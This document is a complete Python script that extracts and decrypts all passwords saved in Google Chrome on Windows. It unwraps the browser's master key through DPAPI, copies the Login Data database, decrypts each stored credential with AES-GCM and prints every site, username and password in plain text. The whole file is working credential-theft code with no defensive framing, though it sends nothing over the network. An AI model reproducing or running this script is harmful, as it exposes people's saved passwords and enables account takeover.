import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    try:
        encrypted_password = bytes(encrypted_password)
        iv = encrypted_password[3:15]
        payload = encrypted_password[15:-16]
        tag = encrypted_password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt_and_verify(payload, tag).decode()
        return decrypted_pass
    except Exception as e:
        return f"Decryption Failed: {e}"

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"],
        "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    shutil.copyfile(db_path, "Loginvault.db")  # Copy to avoid lock

    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            if encrypted_password:
                decrypted_password = decrypt_password(encrypted_password, key)
            else:
                decrypted_password = "No Password Saved"
            print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")
    finally:
        cursor.close()
        conn.close()
        os.remove("Loginvault.db")

if __name__ == "__main__":
    main()
